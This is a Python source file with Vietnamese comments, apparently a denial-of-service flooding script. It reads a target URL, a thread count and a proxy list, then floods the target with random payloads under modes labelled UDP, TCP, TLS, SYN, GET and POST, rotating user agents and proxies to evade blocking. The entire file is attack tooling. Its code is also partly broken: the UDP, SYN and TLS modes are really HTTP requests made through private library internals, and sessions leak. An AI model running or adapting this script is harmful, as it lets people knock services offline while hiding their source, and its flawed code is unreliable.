import asyncio
import random
import string
import time
import ssl
from urllib.parse import urlparse
import aiohttp
import aiohttp_socks
import requests

async def send_request(session, request_type, url, headers, proxy_url, data):
    if proxy_url:
        session = aiohttp.ClientSession(connector=aiohttp_socks.ProxyConnector.from_url(proxy_url), headers=headers)
    else:
        session = aiohttp.ClientSession(headers=headers)

    try:
        if request_type == "udp":
            transport, client = await session._request(
                method="GET",
                url=url,
                proxy=proxy_url,
                data=aiohttp.BytesPayload(data.encode()),
            ).__aenter__()
            transport.close()
            return True

        elif request_type == "tcp":
            transport, client = await session._request(
                method="GET",
                url=url,
                proxy=proxy_url,
                data=aiohttp.BytesPayload(data.encode()),
            ).__aenter__()

            await client._writer.drain()
            await asyncio.sleep(1)
            transport.close()
            return True

        elif request_type == "tls":
            context = ssl.create_default_context()
            transport, client = await session._request(
                method="GET",
                url=url,
                proxy=proxy_url,
                ssl=context,
                data=aiohttp.BytesPayload(data.encode()),
            ).__aenter__()

            await client._writer.drain()
            await asyncio.sleep(1)
            transport.close()
            return True

        elif request_type == "syn":
            await session.head(url, proxy=proxy_url, data=aiohttp.BytesPayload(data.encode()))
            return True

        elif request_type == "get":
            async with session.get(url, proxy=proxy_url, headers=headers) as response:
                status_code = response.status
                if status_code == 200:
                    print(f"Request sent to {url} successfully.")
                return True

        elif request_type == "post":
            async with session.post(url, proxy=proxy_url, headers=headers, data=data) as response:
                status_code = response.status
                if status_code == 200:
                    print(f"Request sent to {url} successfully.")
                return True

    except Exception as e:
        print(f"Exception occured while sending request to {url} with proxy {proxy_url}: {e}")
        return False

async def main():
    # Nhập các tham số từ người dùng
    url = input("URL: ")
    payload = generate_random_payload()
    proxies = read_file_lines("proxy.txt")
    threads = int(input("Số lượng threads: "))
    delay = float(input("Thời gian chờ giữa các yêu cầu (mặc định 0.1 giây): ") or "0.1")
    methods = ["udp", "tcp", "tls", "syn", "get", "post"]
    user_agent = get_random_user_agent()
    cookie = ""

    headers = {"User-Agent": user_agent}

    # Thử lấy cookie từ một request khác
    try:
        response = requests.get(url) 
        if "__cfduid" in response.cookies:
            cookie = response.cookies["__cfduid"]
            print(f"Cookie value found: {cookie}")
    except requests.exceptions.RequestException:
        pass

    # Thêm các thông số vào danh sách yêu cầu
    parsed_url = urlparse(url)

    if not (parsed_url.scheme and parsed_url.netloc):
        raise ValueError("URL không hợp lệ. Hãy nhập một URL hợp lệ.")

    request_kwargs = {"url": url, "headers": headers, "data": payload}

    if cookie:
        request_kwargs.update({"cookies": {"__cfduid": cookie}})

    request_list = [{
        "kwargs": request_kwargs,
        "type": method,
        "proxy": proxy or None,
    } for method in methods for proxy in proxies]

    # Gửi các yêu cầu với các proxy khác nhau
    active_proxies = len(proxies) if proxies else 1 # Số lượng proxy hoặc không sử dụng proxy
    failed_attempts = 0

    while request_list and failed_attempts < active_proxies:
        tasks = []

        for i in range(threads):
            if request_list:
                request = request_list.pop(0)
                task = asyncio.ensure_future(
                    send_request(
                        session=None,
                        request_type=request["type"],
                        url=request["kwargs"]["url"],
                        headers=request["kwargs"]["headers"],
                        proxy_url=request["proxy"],
                        data=request["kwargs"]["data"]
                    )
                )
                tasks.append(task)

        if tasks:
            try:
                results = await asyncio.gather(*tasks, return_exceptions=True)
            except aiohttp_socks.SOCKSConnectionError:
                failed_attempts += 1
                print(f"Proxy {request['proxy']} not responding. Trying another proxy...")

        for i, result in enumerate(results):
            if isinstance(result, Exception): # Gặp lỗi ngoài mong muốn
                print(f"Error encountered at request {i} with proxy {proxies[i % len(proxies)]}: {result}")
                if isinstance(result, aiohttp.ClientHttpProxyError) and result.status == 403: # Trả về 403, đổi proxy
                    proxy = request_list.pop(i % len(request_list))["proxy"]
                    print(f"403 returned with proxy {proxy}. Switching to another proxy..")
                    request_list.append({
                        "kwargs": request_kwargs,
                        "type": methods[i // len(proxies)],
                        "proxy": proxy if proxy != "" else None,
                    })
            elif not result:
                proxy = request_list.pop(i % len(request_list))["proxy"]
                print(f"Failed request with proxy {proxy}. Switching to another proxy..")
                request_list.append({
                    "kwargs": request_kwargs,
                    "type": methods[i // len(proxies)],
                    "proxy": proxy if proxy != "" else None,
                })
            else:
                print(f"Request sent to {request_list[i % len(request_list)]['type']} {request_list[i % len(request_list)]['kwargs']['url']} successfully with proxy {request_list[i % len(request_list)]['proxy']}")

        time.sleep(delay)

    if request_list:
        print(f"{len(request_list)} requests failed with all proxies exhausted.")


def get_random_user_agent():
    with open("ua.txt") as f:
        browsers = f.read().splitlines()

    return random.choice(browsers)


def read_file_lines(filename):
    try:
        with open(filename) as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        lines = []

    return lines


def generate_random_payload():
    length = random.randint(1, 2000)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))

    return payload


if __name__ == "__main__":
    asyncio.run(main())
